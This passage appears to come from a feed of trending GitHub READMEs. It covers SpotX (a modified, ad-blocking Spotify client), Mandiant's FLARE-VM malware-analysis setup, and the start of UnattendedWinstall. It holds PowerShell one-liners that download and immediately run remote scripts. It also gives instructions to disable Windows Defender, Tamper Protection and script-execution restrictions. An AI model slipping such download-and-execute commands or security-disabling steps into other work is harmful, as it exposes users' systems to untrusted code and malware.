 &lt;p&gt; &lt;/p&gt;
 &lt;h4&gt;During installation, you need to confirm some actions, also contains:&lt;/h4&gt; 
 &lt;ul&gt; 
  &lt;li&gt;New theme activated (new right and left sidebar, some cover change)&lt;/li&gt; 
  &lt;li&gt;All &lt;a href=&quot;https://github.com/SpotX-Official/SpotX/discussions/50&quot;&gt;experimental features&lt;/a&gt; included&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;h4&gt; &lt;/h4&gt; 
 &lt;h4&gt;Just download and run &lt;a href=&quot;https://raw.githack.com/amd64fox/SpotX/main/Install_New_theme.bat&quot;&gt;Install.bat&lt;/a&gt;&lt;/h4&gt; 
 &lt;p&gt;or&lt;/p&gt; 
 &lt;h4&gt;Run The following command in PowerShell:&lt;/h4&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;iex &quot;&amp;amp; { $(iwr -useb &#39;https://raw.githubusercontent.com/SpotX-Official/spotx-official.github.io/main/run.ps1&#39;) } -new_theme -block_update_on&quot;
&lt;/code&gt;&lt;/pre&gt; 
 &lt;h4&gt;mirror&lt;/h4&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;iex &quot;&amp;amp; { $(iwr -useb &#39;https://spotx-official.github.io/run.ps1&#39;) } -m -new_theme -block_update_on&quot;
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;small&gt;Usual installation (Old theme)&lt;/small&gt;&lt;/summary&gt;
 &lt;p&gt; &lt;/p&gt;
 &lt;h4&gt;During installation, you need to confirm some actions, also contains:&lt;/h4&gt; 
 &lt;ul&gt; 
  &lt;li&gt;Forced installation of version 1.2.13 (since the old theme was removed in subsequent versions)&lt;/li&gt; 
  &lt;li&gt;Old theme activated&lt;/li&gt; 
  &lt;li&gt;Automatic blocking of Spotify updates&lt;/li&gt; 
  &lt;li&gt;All &lt;a href=&quot;https://github.com/SpotX-Official/SpotX/discussions/50&quot;&gt;experimental features&lt;/a&gt; included&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;h4&gt; &lt;/h4&gt; 
 &lt;h4&gt;Just download and run &lt;a href=&quot;https://raw.githack.com/amd64fox/SpotX/main/Install_Old_theme.bat&quot;&gt;Install.bat&lt;/a&gt;&lt;/h4&gt; 
 &lt;p&gt;or&lt;/p&gt; 
 &lt;h4&gt;Run The following command in PowerShell:&lt;/h4&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;iex &quot;&amp;amp; { $(iwr -useb &#39;https://raw.githubusercontent.com/SpotX-Official/spotx-official.github.io/main/run.ps1&#39;) } -v 1.2.13.661.ga588f749-4064 -confirm_spoti_recomended_over -block_update_on&quot;
&lt;/code&gt;&lt;/pre&gt; 
 &lt;h4&gt;mirror&lt;/h4&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;iex &quot;&amp;amp; { $(iwr -useb &#39;https://spotx-official.github.io/run.ps1&#39;) } -m -v 1.2.13.661.ga588f749-4064 -confirm_spoti_recomended_over -block_update_on&quot;
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;small&gt;Full installation&lt;/small&gt;&lt;/summary&gt;
 &lt;p&gt; &lt;/p&gt;
 &lt;h4&gt;Full installation without confirmation, what does it do?&lt;/h4&gt; 
 &lt;ul&gt; 
  &lt;li&gt;New theme activated (new right and left sidebar, some cover change)&lt;/li&gt; 
  &lt;li&gt;Hiding podcasts/episodes/audiobooks from the homepage&lt;/li&gt; 
  &lt;li&gt;Activated &lt;a href=&quot;https://github.com/SpotX-Official/SpotX/discussions/50#discussioncomment-4096066&quot;&gt;static theme&lt;/a&gt; &lt;kbd&gt;spotify&lt;/kbd&gt; for lyrics&lt;/li&gt; 
  &lt;li&gt;Hiding &lt;a href=&quot;https://github.com/SpotX-Official/SpotX/discussions/50#discussioncomment-4478943&quot;&gt;ad-like sections&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;All &lt;a href=&quot;https://github.com/SpotX-Official/SpotX/discussions/50&quot;&gt;experimental features&lt;/a&gt; included&lt;/li&gt; 
  &lt;li&gt;Removal of Spotify MS if it was found&lt;/li&gt; 
  &lt;li&gt;Installation of the recommended version of Spotify (if another client has already been found, it will be installed over)&lt;/li&gt; 
  &lt;li&gt;Blocking of Spotify updates&lt;/li&gt; 
  &lt;li&gt;After the installation is completed, the client will autorun.&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;h4&gt; &lt;/h4&gt; 
 &lt;h4&gt;Just download and run &lt;a href=&quot;https://raw.githack.com/amd64fox/SpotX/main/scripts/Install_Auto.bat&quot;&gt;Install_Auto.bat&lt;/a&gt;&lt;/h4&gt; 
 &lt;p&gt;or&lt;/p&gt; 
 &lt;h4&gt;Run The following command in PowerShell:&lt;/h4&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;iex &quot;&amp;amp; { $(iwr -useb &#39;https://raw.githubusercontent.com/SpotX-Official/spotx-official.github.io/main/run.ps1&#39;) } -confirm_uninstall_ms_spoti -confirm_spoti_recomended_over -podcasts_off -block_update_on -start_spoti -new_theme -adsections_off -lyrics_stat spotify&quot;
&lt;/code&gt;&lt;/pre&gt; 
 &lt;h4&gt;mirror&lt;/h4&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;iex &quot;&amp;amp; { $(iwr -useb &#39;https://spotx-official.github.io/run.ps1&#39;) } -m -confirm_uninstall_ms_spoti -confirm_spoti_recomended_over -podcasts_off -block_update_on -start_spoti -new_theme -adsections_off -lyrics_stat spotify&quot;
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;small&gt;Other types of installations&lt;/small&gt;&lt;/summary&gt;
 &lt;p&gt;&lt;small&gt; &lt;/small&gt;&lt;/p&gt;
 &lt;details&gt;
  &lt;small&gt; &lt;summary&gt;&lt;small&gt;Installation for premium&lt;/small&gt;&lt;/summary&gt;&lt;p&gt; &lt;/p&gt;&lt;h4&gt;Usual installation only without ad blocking, for those who have a premium account, also contains:&lt;/h4&gt; 
   &lt;ul&gt; 
    &lt;li&gt;New theme activated (new right and left sidebar, some cover change)&lt;/li&gt; 
    &lt;li&gt;Disabled only audio ads in podcasts&lt;/li&gt; 
    &lt;li&gt;All &lt;a href=&quot;https://github.com/SpotX-Official/SpotX/discussions/50&quot;&gt;experimental features&lt;/a&gt; included&lt;/li&gt; 
   &lt;/ul&gt; &lt;h4&gt; &lt;/h4&gt; &lt;h4&gt;Just download and run &lt;a href=&quot;https://raw.githack.com/amd64fox/SpotX/main/scripts/Install_Prem.bat&quot;&gt;Install_Prem.bat&lt;/a&gt;&lt;/h4&gt; &lt;p&gt;or&lt;/p&gt; &lt;h4&gt;Run The following command in PowerShell:&lt;/h4&gt; &lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;iex &quot;&amp;amp; { $(iwr -useb &#39;https://raw.githubusercontent.com/SpotX-Official/spotx-official.github.io/main/run.ps1&#39;) } -premium -new_theme -block_update_on&quot;
&lt;/code&gt;&lt;/pre&gt; &lt;h4&gt;mirror&lt;/h4&gt; &lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;iex &quot;&amp;amp; { $(iwr -useb &#39;https://spotx-official.github.io/run.ps1&#39;) } -m -premium -new_theme -block_update_on&quot;
&lt;/code&gt;&lt;/pre&gt; &lt;/small&gt;
 &lt;/details&gt;
 &lt;small&gt; 
  &lt;details&gt; 
   &lt;summary&gt;&lt;small&gt;Installing with parameters&lt;/small&gt;&lt;/summary&gt;
   &lt;p&gt; &lt;/p&gt;
   &lt;p&gt;You can specify various parameters for a more flexible installation, more &lt;a href=&quot;https://github.com/SpotX-Official/SpotX/discussions/60&quot;&gt;details here&lt;/a&gt;&lt;/p&gt; 
  &lt;/details&gt; &lt;/small&gt;
&lt;/details&gt;
&lt;small&gt; &lt;h1 id=&quot;uninstall&quot;&gt;Uninstall&lt;/h1&gt; 
 &lt;ul&gt; 
  &lt;li&gt;Just run &lt;a href=&quot;https://raw.githack.com/amd64fox/SpotX/main/Uninstall.bat&quot;&gt;Uninstall.bat&lt;/a&gt;&lt;/li&gt; 
 &lt;/ul&gt; &lt;p&gt;or&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;Reinstall Spotify (&lt;a href=&quot;https://github.com/amd64fox/Uninstall-Spotify&quot;&gt;Full uninstall Spotify&lt;/a&gt; recommended)&lt;/li&gt; 
 &lt;/ul&gt; &lt;h1 id=&quot;faq&quot;&gt;FAQ&lt;/h1&gt; &lt;p&gt;Read &lt;a href=&quot;https://telegra.ph/SpotX-FAQ-09-19&quot;&gt;FAQ&lt;/a&gt;&lt;/p&gt; &lt;h1 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h1&gt; &lt;p&gt;SpotX is a modified version of the official Spotify client, provided as an evaluation version, you use it at your own risk.&lt;/p&gt; &lt;/small&gt;</description>
    </item>
    
    <item>
      <title>mandiant/flare-vm</title>
      <link>https://github.com/mandiant/flare-vm</link>
      <description>&lt;p&gt;A collection of software installations scripts for Windows systems that allows you to easily setup and maintain a reverse engineering environment on a VM.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;FLARE-VM&lt;/h1&gt; 
&lt;p&gt;Welcome to FLARE-VM - a collection of software installations scripts for Windows systems that allows you to easily setup and maintain a reverse engineering environment on a virtual machine (VM). FLARE-VM was designed to solve the problem of reverse engineering tool curation and relies on two main technologies: &lt;a href=&quot;https://chocolatey.org&quot;&gt;Chocolatey&lt;/a&gt; and &lt;a href=&quot;https://boxstarter.org&quot;&gt;Boxstarter&lt;/a&gt;. Chocolatey is a Windows-based Nuget package management system, where a &quot;package&quot; is essentially a ZIP file containing PowerShell installation scripts that download and configure a specific tool. Boxstarter leverages Chocolatey packages to automate the installation of software and create repeatable, scripted Windows environments.&lt;/p&gt; 
&lt;p align=&quot;center&quot;&gt; &lt;img src=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/Images/flarevm-logo.png&quot; alt=&quot;FLARE-VM Logo&quot; width=&quot;600&quot; /&gt; &lt;/p&gt; 
&lt;h2&gt;Requirements&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;FLARE-VM should ONLY be installed on a virtual machine&lt;/strong&gt;. The VM should satisfy the following requirements:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Windows ≥ 10&lt;/li&gt; 
 &lt;li&gt;PowerShell ≥ 5&lt;/li&gt; 
 &lt;li&gt;Disk capacity of at least 60 GB and memory of at least 2GB&lt;/li&gt; 
 &lt;li&gt;Usernames without spaces or other special characters&lt;/li&gt; 
 &lt;li&gt;Internet connection&lt;/li&gt; 
 &lt;li&gt;Tamper Protection and any Anti-Malware solution (e.g., Windows Defender) disabled, preferably via Group Policy&lt;/li&gt; 
 &lt;li&gt;Windows Updates Disabled&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Installation instruction&lt;/h2&gt; 
&lt;p&gt;This section documents the steps to install FLARE-VM. You may also find useful the &lt;a href=&quot;https://www.youtube.com/watch?v=i8dCyy8WMKY&quot;&gt;&lt;em&gt;Building a VM for Reverse Engineering and Malware Analysis! Installing the FLARE-VM&lt;/em&gt; video&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Pre-installation&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Prepare a Windows 10+ virtual machine 
  &lt;ul&gt; 
   &lt;li&gt;Install Windows in the virtual machine, for example using the raw Windows 10 ISO from &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows10ISO&quot;&gt;https://www.microsoft.com/en-us/software-download/windows10ISO&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;Ensure the &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/#requirements&quot;&gt;requirements above&lt;/a&gt; are satisfied, including: 
    &lt;ul&gt; 
     &lt;li&gt;Disable Windows Updates (at least until installation is finished) 
      &lt;ul&gt; 
       &lt;li&gt;&lt;a href=&quot;https://www.windowscentral.com/how-stop-updates-installing-automatically-windows-10&quot;&gt;https://www.windowscentral.com/how-stop-updates-installing-automatically-windows-10&lt;/a&gt;&lt;/li&gt; 
      &lt;/ul&gt; &lt;/li&gt; 
     &lt;li&gt;Disable Tamper Protection and any Anti-Malware solution (e.g., Windows Defender), preferably via Group Policy. 
      &lt;ul&gt; 
       &lt;li&gt;GPO: &lt;a href=&quot;https://superuser.com/a/1757341&quot;&gt;https://stackoverflow.com/questions/62174426/how-to-permanently-disable-windows-defender-real-time-protection-with-gpo&lt;/a&gt;&lt;/li&gt; 
       &lt;li&gt;Non-GPO - Manual: &lt;a href=&quot;https://www.maketecheasier.com/permanently-disable-windows-defender-windows-10&quot;&gt;https://www.maketecheasier.com/permanently-disable-windows-defender-windows-10/&lt;/a&gt;&lt;/li&gt; 
       &lt;li&gt;Non-GPO - Automated: &lt;a href=&quot;https://github.com/ionuttbara/windows-defender-remover&quot;&gt;https://github.com/ionuttbara/windows-defender-remover&lt;/a&gt;&lt;/li&gt; 
       &lt;li&gt;Non-GPO - Semi-Automated (User needs to toggle off Tamper Protection): &lt;a href=&quot;https://github.com/AveYo/LeanAndMean/raw/main/ToggleDefender.ps1&quot;&gt;https://github.com/AveYo/LeanAndMean/blob/main/ToggleDefender.ps1&lt;/a&gt;&lt;/li&gt; 
      &lt;/ul&gt; &lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Take a VM snapshot so you can always revert to a state before the FLARE-VM installation&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;FLARE-VM installation&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Open a &lt;code&gt;PowerShell&lt;/code&gt; prompt as administrator&lt;/li&gt; 
 &lt;li&gt;Download the installation script &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1&quot;&gt;&lt;code&gt;installer.ps1&lt;/code&gt;&lt;/a&gt; to your Desktop: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;(New-Object net.webclient).DownloadFile(&#39;https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1&#39;,&quot;$([Environment]::GetFolderPath(&quot;Desktop&quot;))\install.ps1&quot;)&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Unblock the installation script: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;Unblock-File .\install.ps1&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Enable script execution: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;Set-ExecutionPolicy Unrestricted -Force&lt;/code&gt; 
    &lt;ul&gt; 
     &lt;li&gt;If you receive an error saying the execution policy is overridden by a policy defined at a more specific scope, you may need to pass a scope in via &lt;code&gt;Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force&lt;/code&gt;. To view execution policies for all scopes, execute &lt;code&gt;Get-ExecutionPolicy -List&lt;/code&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Finally, execute the installer script as follow: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;.\install.ps1&lt;/code&gt; 
    &lt;ul&gt; 
     &lt;li&gt;To pass your password as an argument: &lt;code&gt;.\install.ps1 -password &amp;lt;password&amp;gt;&lt;/code&gt;&lt;/li&gt; 
     &lt;li&gt;To use the CLI-only mode with minimal user interaction: &lt;code&gt;.\install.ps1 -password &amp;lt;password&amp;gt; -noWait -noGui&lt;/code&gt;&lt;/li&gt; 
     &lt;li&gt;To use the CLI-only mode with minimal user interaction and a custom config file: &lt;code&gt;.\install.ps1 -customConfig &amp;lt;config.xml&amp;gt; -password &amp;lt;password&amp;gt; -noWait -noGui&lt;/code&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;After installation it is recommended to switch to &lt;code&gt;host-only&lt;/code&gt; networking mode and take a VM snapshot&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Installer Parameters&lt;/h4&gt; 
&lt;p&gt;Below are the CLI parameter descriptions.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;PARAMETERS
    -password &amp;lt;String&amp;gt;
        Current user password to allow reboot resiliency via Boxstarter. The script prompts for the password if not provided.

    -noPassword [&amp;lt;SwitchParameter&amp;gt;]
        Switch parameter indicating a password is not needed for reboots.

    -customConfig &amp;lt;String&amp;gt;
        Path to a configuration XML file. May be a file path or URL.

    -customLayout &amp;lt;String&amp;gt;
        Path to a taskbar layout XML file. May be a file path or URL.

    -noWait [&amp;lt;SwitchParameter&amp;gt;]
        Switch parameter to skip installation message before installation begins.

    -noGui [&amp;lt;SwitchParameter&amp;gt;]
        Switch parameter to skip customization GUI.

    -noReboots [&amp;lt;SwitchParameter&amp;gt;]
        Switch parameter to prevent reboots (not recommended).

    -noChecks [&amp;lt;SwitchParameter&amp;gt;]
        Switch parameter to skip validation checks (not recommended).
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Get full usage information by running &lt;code&gt;Get-Help .\install.ps1 -Detailed&lt;/code&gt;.&lt;/p&gt; 
&lt;h4&gt;Installer GUI&lt;/h4&gt; 
&lt;p&gt;The Installer GUI is display after executing the validation checks and installing Boxstarter and Chocolatey (if they are not installed already). Using the installer GUI you may customize:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Package selection from FLARE-VM and Chocolatey community&lt;/li&gt; 
 &lt;li&gt;Environment variable paths&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/Images/installer-gui.png&quot; alt=&quot;Installer GUI&quot; /&gt;&lt;/p&gt; 
&lt;h4&gt;Configuration&lt;/h4&gt; 
&lt;p&gt;The installer will download &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/config.xml&quot;&gt;&lt;code&gt;config.xml&lt;/code&gt;&lt;/a&gt; from the FLARE-VM repository. This file contains the default configuration, including the list of packages to install and the environment variable paths. You may use your own configuration by specifying the CLI-argument &lt;code&gt;-customConfig&lt;/code&gt; and providing either a local file path or URL to your &lt;code&gt;config.xml&lt;/code&gt; file. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;.\install.ps1 -customConfig &quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/config.xml&quot;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Taskbar Layout&lt;/h4&gt; 
&lt;p&gt;The installer will use &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/CustomStartLayout.xml&quot;&gt;&lt;code&gt;CustomStartLayout.xml&lt;/code&gt;&lt;/a&gt; from the FLARE-VM repository. This file contains the default taskbar layout. You may use your own configuration by specifying the CLI-argument &lt;code&gt;-customLayout&lt;/code&gt; and providing a local file path or URL to your &lt;code&gt;CustomStartLayout.xml&lt;/code&gt; file. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;.\install.ps1 -customLayout &quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/CustomStartLayout.xml&quot;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h5&gt;Things to Consider:&lt;/h5&gt; 
&lt;ul&gt; 
 &lt;li&gt;Items in the .xml that are not installed will not display in the taskbar (no broken links will be pinned)&lt;/li&gt; 
 &lt;li&gt;Only applications (&lt;code&gt;.exe&lt;/code&gt; files) or shortcuts to applications can be pinned.&lt;/li&gt; 
 &lt;li&gt;If you would like to pin something that isn&#39;t an application, consider creating a shortcut that points to &lt;code&gt;cmd.exe&lt;/code&gt; or &lt;code&gt;powershell&lt;/code&gt; with arguments supplied that will perform that actions you would like.&lt;/li&gt; 
 &lt;li&gt;If you would like to make something run with admin rights, consider making a shortcut using &lt;code&gt;VM-Install-Shortcut&lt;/code&gt; with the flag &lt;code&gt;-runAsAdmin&lt;/code&gt; and pinning the shortcut.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Post installation steps&lt;/h4&gt; 
&lt;p&gt;You can include any post installation step you like in the configuration inside the tags &lt;code&gt;apps&lt;/code&gt;, &lt;code&gt;services&lt;/code&gt;, &lt;code&gt;path-items&lt;/code&gt;, &lt;code&gt;registry-items&lt;/code&gt;, and &lt;code&gt;custom-items&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;For example:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;To show known file extensions:&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;    &amp;lt;registry-items&amp;gt;
        &amp;lt;registry-item name=&quot;Show known file extensions&quot; path=&quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot; value=&quot;HideFileExt&quot; type=&quot;DWord&quot; data=&quot;0&quot;/&amp;gt;
    &amp;lt;/registry-items&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For more examples, check the default configuration file: &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/config.xml&quot;&gt;&lt;code&gt;config.xml&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Check our &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/CONTRIBUTING.md&quot;&gt;CONTRIBUTING guide&lt;/a&gt; to learn how to contribute to the project.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Troubleshooting&lt;/h2&gt; 
&lt;p&gt;If your installation fails, please attempt to identify the reason for the installation error by reading through the log files listed below on your system:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;%VM_COMMON_DIR%\log.txt&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;%PROGRAMDATA%\chocolatey\logs\chocolatey.log&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;%LOCALAPPDATA%\Boxstarter\boxstarter.log&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Ensure you are running the latest version of the FLARE-VM installer and that your VM satisfies the &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/#requirements&quot;&gt;requirements&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Installer Error&lt;/h3&gt; 
&lt;p&gt;If the installation failed due to an issue in the installation script (e.g., &lt;code&gt;install.ps1&lt;/code&gt;), &lt;a href=&quot;https://github.com/mandiant/flare-vm/issues/new?labels=%3Abug%3A+bug&amp;amp;template=bug.yml&quot;&gt;report the bug in FLARE-VM&lt;/a&gt;. Provide all the information requested to ensure we are able to help you.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Rarely should &lt;code&gt;install.ps1&lt;/code&gt; be the reason for an installation failure. Most likely it is a specific package or set of packages that are failing (see below).&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Package Error&lt;/h3&gt; 
&lt;p&gt;Packages fail to install from time to time -- this is normal. The most common reasons are outlined below:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Failure or timeout from Chocolatey or MyGet to download a &lt;code&gt;.nupkg&lt;/code&gt; file&lt;/li&gt; 
 &lt;li&gt;Failure or timeout due to remote host when downloading a tool&lt;/li&gt; 
 &lt;li&gt;Intrusion Detection System (IDS) or AV product (e.g., Windows Defender) prevents a tool download or removes the tool from the system&lt;/li&gt; 
 &lt;li&gt;Host specific issue, for example when using an untested version&lt;/li&gt; 
 &lt;li&gt;Tool fails to build due to dependencies&lt;/li&gt; 
 &lt;li&gt;Old tool URL (e.g., &lt;code&gt;HTTP STATUS 404&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;Tool&#39;s SHA256 hash has changed from what is hardcoded in the package installation script&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;Reasons &lt;strong&gt;1-4&lt;/strong&gt; are difficult for us to fix since we do not control them. If an issue related to reasons &lt;strong&gt;1-4&lt;/strong&gt; is filed, it is unlikely we will be able to assist.&lt;/p&gt; 
&lt;p&gt;We can help with reasons &lt;strong&gt;5-7&lt;/strong&gt; and welcome the community to contribute fixes as well! Please &lt;a href=&quot;https://github.com/mandiant/VM-Packages/issues/new?labels=%3Abug%3A+bug&amp;amp;template=bug.yml&quot;&gt;report the bug in VM-Packages&lt;/a&gt; providing all the information requested.&lt;/p&gt; 
&lt;h3&gt;Updates&lt;/h3&gt; 
&lt;p&gt;Note that package updates are best effort and that updates are not being tested. If you encounter errors, perform a fresh FLARE-VM install.&lt;/p&gt; 
&lt;h2&gt;Legal Notice&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;This download configuration script is provided to assist cyber security analysts in creating handy and versatile toolboxes for malware analysis environments. It provides a convenient interface for them to obtain a useful set of analysis tools directly from their original sources. Installation and use of this script is subject to the Apache 2.0 License. You as a user of this script must review, accept and comply with the license terms of each downloaded/installed package. By proceeding with the installation, you are accepting the license terms of each package, and acknowledging that your use of each package will be subject to its respective license terms.&lt;/p&gt; 
&lt;/blockquote&gt;</description>
    </item>
    
    <item>
      <title>memstechtips/UnattendedWinstall</title>
      <link>https://github.com/memstechtips/UnattendedWinstall</link>
      <description>&lt;p&gt;Personalized Unattended Answer Files that helps automatically debloat and customize Windows 10 &amp; 11 during the installation process.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;UnattendedWinstall&lt;/h1&gt; 
&lt;h2&gt;Introduction&lt;/h2&gt; 
&lt;p&gt;UnattendedWinstall leverages Microsoft&#39;s &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11&quot;&gt;Answer Files&lt;/a&gt; (or Unattend files) to automate and customize Windows installations. &lt;br /&gt; It enables modifications to Windows Settings and Packages directly in the Windows ISO during setup.&lt;/p&gt; 
&lt;h3&gt;Why Use an Answer File?&lt;/h3&gt; 
&lt;h4&gt;Security&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Provides transparency by allowing inspection of all changes in the answer file.&lt;/li&gt; 
 &lt;li&gt;Runs directly on official Windows ISOs from Microsoft, eliminating the need for unofficial sources.&lt;/li&gt; 
 &lt;li&gt;Utilizes a Microsoft-supported feature designed for streamlined mass deployment of Windows installations.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Automation&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Enables automated configuration across multiple devices, saving time and effort by eliminating repetitive manual setups.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] UnattendedWinstall has been tested and optimized for personal use. For those interested in customizing further, &lt;a href=&quot;https://schneegans.de/windows/unattend-generator/&quot;&gt;create your own answer file&lt;/a&gt; following &lt;a href=&quot;https://youtu.be/WyLiJl-NQU8&quot;&gt;this video guide&lt;/a&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Versions&lt;/h3&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/releases/tag/v2.1.0&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Version-2.1.0%20Latest-0078D4?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white&quot; alt=&quot;Version 2 Release (Latest)&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/releases/tag/v1.0.0&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Version-1.0.0-FFA500?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white&quot; alt=&quot;Version 1 Release&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Support the Project&lt;/h3&gt; 
&lt;p&gt;If UnattendedWinstall has been useful to you, consider supporting the project, it really does help!&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://paypal.me/memstech&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Support-via%20PayPal-FFD700?style=for-the-badge&amp;amp;logo=paypal&amp;amp;logoColor=white&quot; alt=&quot;Support via PayPal&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Feedback and Community&lt;/h3&gt; 
&lt;p&gt;If you have feedback, suggestions, or need help with UnattendedWinstall, please feel free to join the discussion on GitHub or our Discord community:&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/discussions&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Join-the%20Discussion-2D9F2D?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white&quot; alt=&quot;Join the Discussion&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://www.discord.gg/zWGANV8QAX&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Join-Discord%20Community-5865F2?style=for-the-badge&amp;amp;logo=discord&amp;amp;logoColor=white&quot; alt=&quot;Join Discord Community&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Requirements&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Windows 10 or Windows 11 
  &lt;ul&gt; 
